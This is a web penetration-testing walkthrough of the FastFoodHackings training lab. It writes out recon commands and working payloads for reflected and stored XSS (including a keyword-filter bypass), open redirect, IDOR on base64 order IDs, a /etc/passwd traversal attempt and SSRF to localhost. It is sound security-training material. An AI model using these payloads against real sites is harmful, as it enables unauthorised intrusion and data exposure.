---
title: "Hacking FastFoodHackings"
draft: false
tags: ["web_pentesting"]
categories: ["Web Security"]
weight: 2
---
![Description of Image](/images/fastfoodhackings/fastfoodhackings-poster.png)

In this article I will continue revealing techniques I used when performing penetration testing on a web application I will try on `FastFoodHackings` it is a  small free demo website from bugbountyhunter.com website you can access it from this URL
```php
https://www.bugbountytraining.com/fastfoodhackings/
```
I added the URL to scope to see only the files related to this URL
![Image](/images/fastfoodhackings/burp-scope.png)
Press here 
![Image](/images/fastfoodhackings/press-here-with-mouse.png)
check this box
![Image](/images/first-blood-v1/checkbox1.png)
Choose `discover content` from `Engagement tools` to Discover endpoints on the website 
![Image](/images/fastfoodhackings/content-discover1.png)

Press here to start Content Discovery
![Image](/images/fastfoodhackings/press-here-with-mouse2.png)
Then I will use the crawl of scan option to visit all the endpoints on the website
![Image](/images/fastfoodhackings/scan.png)
![Image](/images/fastfoodhackings/crawl.png)


As the content discovery and crawling is working, I need to know the technology the website is working with. One way is by using quickhits.txt file from seclists 
```php
ffuf -u https://www.bugbountytraining.com/fastfoodhackings/FUZZ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt 
```
![Image](/images/fastfoodhackings/ffuf1.png)
From the above about the backend server supports PHP files
<br>
Another way to find the technology at the backend is from the error default page type any unkown words to get to the error page. This is the error of Nginx Server
![Image](/images/first-blood-v1/nginx-default-page.png)

From the sitemap you find that the available extensions are `php`
![Image](/images/fastfoodhackings/sitemap-3.png) 

So i will fuzz with these extensions `PHP`
```php
ffuf -u https://www.bugbountytraining.com/fastfoodhackings/FUZZ  -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -e .php
```
![Image](/images/fastfoodhackings/fuzzing1.png) 

These are the files I got from Fuzzing & content discovery
- index.php
- go.php
- book.php
- confirmed.php
- locations.php
- menu.php
- yourprofile.php
- admin.php
<br>
and `/api` directory

I will begin with index.php file from the sitemap we see it accepts `act` parameter
<br>
**First** I will use `Param Miner` extension to see if it accepts other parameters
![Image](/images/fastfoodhackings/param-miner1.png) 
![Image](/images/first-blood-v1/param-miner-guess2.png) 
Then go `Extensions - Param Miner - Output` as you can see Param Miner has discovered `act` parameter only
![Image](/images/fastfoodhackings/param-miner2.png) 
**Second** i will use [Arjun](https://github.com/s0md3v/Arjun) tool
```php
arjun -u https://www.bugbountytraining.com/fastfoodhackings/
```
![Image](/images/fastfoodhackings/arjun1.png) 

Let's test the `act` parameter. We can test with root directory `/` directly without typing index.php 
<br>
open the url
```php
https://www.bugbountytraining.com/fastfoodhackings/?act=test123
```
Intercept the request with BurpSuite and send it to Repeater tab, check the `Auto-scroll to match when text changes` box to search for the what you type in the search bar `test123` on every request
![Image](/images/fastfoodhackings/Repeater-checkbox1.png) 

At the response the input of `act` parameter is inside 
<span style="color: red;">&lt;!--  Invalid action:</span>
<span style="color: blue;">{User-Input}</span>
<span style="color: red;">--&gt;</span>
Since the user input is reflected at the response let's test for XSS. This is HTML Comment tag let's <span style="color: green;">close the tags</span> and put our <span style="color: blue;">payload</span>
<br>
 <span style="color: red;">&lt;!--  Invalid action:</span>
 <span style="color: green;">--></span><span style="color: blue;">&lt;script&gt;alert(1)&lt;/script&gt;</span><span style="color: green;"><!</span>
 <span style="color: red;">--&gt;</span>
 <br>
 As you see `script` word is removed so maybe it's blacklisting
![Image](/images/fastfoodhackings/Root-Repeater-test1.png) 
 Let's try other payload  <span style="color: blue;">&lt;img src=x onerror=alert(1)&gt;</span>
It passed
![Image](/images/fastfoodhackings/Root-Repeater-test2.png) 
Let’s try the payload at the browser now
```php
https://www.bugbountytraining.com/fastfoodhackings/?act=--%3E%3Cimg%20src=x%20onerror=alert(1)%3C!--
```
We have discovered Reflective XSS vulnerability
![Image](/images/fastfoodhackings/Root-xss1.png) 

Lets now test file `go.php` i will use Param Miner extension & Arjun tool to see if it accepts any parameters
<br>
As we see it accepts `returnUrl` parameter
```php
arjun -u https://www.bugbountytraining.com/fastfoodhackings/go.php --stable
```
![Image](/images/fastfoodhackings/arjun2.png) 
![Image](/images/fastfoodhackings/param-miner3.png) 
from the parameter name it can accepts url so we can test for [open redirection](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html) and [SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) vulnerabilities
<br>
lets test for open redirection first
```php
https://www.bugbountytraining.com/fastfoodhackings/go.php?returnUrl=https://google.com
```
![Image](/images/fastfoodhackings/openredirect1.png) 
If you submit the url at the browser you will be redirected to google.com so it's vulnerable to Open Redirection
![Image](/images/fastfoodhackings/openredirect1.1.png) 
Let's test now for SSRF. From the image below this endpoint is not vulnerable to SSRF
```php
https://www.bugbountytraining.com/fastfoodhackings/go.php?returnUrl=http://127.0.0.1
```
![Image](/images/fastfoodhackings/ssrf-fail1.png) 

Let's now test file `book.php` from the site map we see it accepts `promoCode` parameter. I tested also with Param Miner & Arjun to see if it accepts other parameters
Let's open the url with the parameter provided at Site Map in the Browser
```php
https://www.bugbountytraining.com/fastfoodhackings/book.php?promoCode=UKONLY
```
![Image](/images/fastfoodhackings/bookpage1.png) 
If we look at the HTTPHistory through Burp Proxy tab we see that the value of `promoCode` parameter is set on `promotion` on the `Set-Cookie` Header
![Image](/images/fastfoodhackings/book-proxy-promocode.png) 
We now need to know if this value appears on other page so we can see if can make use of it 
<br>
Right Click on fastfoodhackings directory and from `Engagement tools` choose `Search`
![Image](/images/fastfoodhackings/search-promotion.png) 

I want to search if `UKONLY` appears on the Response Body of any page so i will check only on `Response Body` 
![Image](/images/fastfoodhackings/ukonly-search.png) 
As we see two pages appears `menu.php` and`locations.php`
<br>
lets begin with `locations.php`.If you visit the following url and view the `Page Source`
```php
https://www.bugbountytraining.com/fastfoodhackings/locations.php
```
You will see that `UKONLY` is inside href tag which means it's hardcoded value
![Image](/images/fastfoodhackings/locations-ukpromo.png) 

lets see now the menu.php file. visit the following url and view the `Page Source`
```php
https://www.bugbountytraining.com/fastfoodhackings/menu.php
```
![Image](/images/fastfoodhackings/menu-php-promotionparameter1.png) 
Let's confirm that by changing the value of `promoCode` it will be changed on the menu.php page. I will change it to `test123` by visiting the following url 
```php
https://www.bugbountytraining.com/fastfoodhackings/book.php?promoCode=test123
```
Then go to menu.php and view the `Page Source` as you see the value has changed
![Image](/images/fastfoodhackings/menu-php-promotionparameter2.png) 

Since the value is reflected we will test for XSS vulnerability. our input is inside
<span style="color: red;">var promotion = &apos;</span><span style="color: blue;">{User-Input}</span><span style="color: red;">&apos;</span>
since var and it's already inside <span style="color: blue;">&lt;script&gt; &lt;/script&gt;</span>
let's try to <span style="color: green;">close the variable</span> and put our payload 
<span style="color: green;">&apos;;</span><span style="color: blue;">alert(1);</span><span style="color: green;">var x=&apos;y</span>
we have closed the promotion variable and put our payload and then put other variable to close the last single quote
<span style="color: red;">var promotion = &apos;</span><span style="color: blue;"><span style="color: green;">&apos;;</span><span style="color: blue;">alert(1);</span><span style="color: green;">var x=&apos;y</span></span><span style="color: red;">&apos;</span>
<br>
Let's test it. Open the following URL
```php
https://www.bugbountytraining.com/fastfoodhackings/book.php?promoCode=';alert(1);var x='y
```
Then open the menu.php file 
```php
https://www.bugbountytraining.com/fastfoodhackings/menu.php
```
and View the Page Source. you will see that `alert` word disapered so it's blacklisted. I tried the word `confirm` it was also blacklisted
![Image](/images/fastfoodhackings/menu-php-promotionparameter3.png) 
If the filter removes the whole keyword `alert` let's try to divide it into two parts `al` & `ipt` and put word `ert` between them so when it's removed they will be concatenated and provide the wanted `alert` word. so our payload should now be 
<span style="color: green;">&apos;;</span><span style="color: blue;">alalertert(1);</span><span style="color: green;">var x=&apos;y</span>
<br>
Let's test it. Open the following URL

```php
https://www.bugbountytraining.com/fastfoodhackings/book.php?promoCode=';alalertert(1);var x='y
```
Then visit the menu.php endpoint
```php
https://www.bugbountytraining.com/fastfoodhackings/menu.php
```
You will see that the xss is triggered. This is Stored XSS vulnerability
![Image](/images/fastfoodhackings/menu-xss1.png) 

When we visited book.php endpoint we see a form 
```php
https://www.bugbountytraining.com/fastfoodhackings/book.php
```
![Image](/images/fastfoodhackings/book-form1.png) 
Let's fill it and then press RESERVE BOOKING Button
![Image](/images/fastfoodhackings/book-form2.png) 
You get this
![Image](/images/fastfoodhackings/book-form3.png) 
If you go Burp History at the Proxy Tab. You will see that this request is generated
![Image](/images/fastfoodhackings/book-form4.png)
Let's send the request to the Repeater. If you shade the value of `order_id` parameter you will find it's base64 encoded value of our Order ID number `42069`
![Image](/images/fastfoodhackings/book-form5.png)
Let's try to change this Order ID number to see if we can access other users data, i will change it to `42067` and then press `Apply changes` Button to take effect at the request
![Image](/images/fastfoodhackings/book-form6.png)
As shown at the image we have accessed other user data, so it's vulnerable to [IDOR](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html) vulnerability
![Image](/images/fastfoodhackings/book-form7.png)

Lets now test `/api` endpoints
![Image](/images/fastfoodhackings/api-sitemap1.png)
As you see their is a file loader.php that has `f` parameter
```php
https://www.bugbountytraining.com/fastfoodhackings/api/loader.php?f=/reviews.php
```
Let's intercept the request with Burp and send it to Repeater. When I see parameter=file the first thing that comes to my mind is to test for [LFI](https://owasp.org/www-community/attacks/Path_Traversal) vulnerability. since the backend server is linux i will try this payload `../../../../../etc/passwd`
<br>
It didn't work
![Image](/images/fastfoodhackings/etc-passwd-payload.png)
Let's try to send an empty parameter and see what happens. As we see it reveals an internal URL path and an Auth Bearer token
![Image](/images/fastfoodhackings/loader-file-empty-payload.png)
Let's test this info. I will test for [SSRF](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/) vulnerability to see I can access internal paths. i have used the url `http://127.0.0.1/` to load the local internal website. As you see in the image below i got access to the internal website so it is vulnerable to SSRF vulnerability
![Image](/images/fastfoodhackings/ssrf1.png)

For all the vulnerabilities you can see the disclosed vulnerabilities here
https://www.bugbountyhunter.com/playground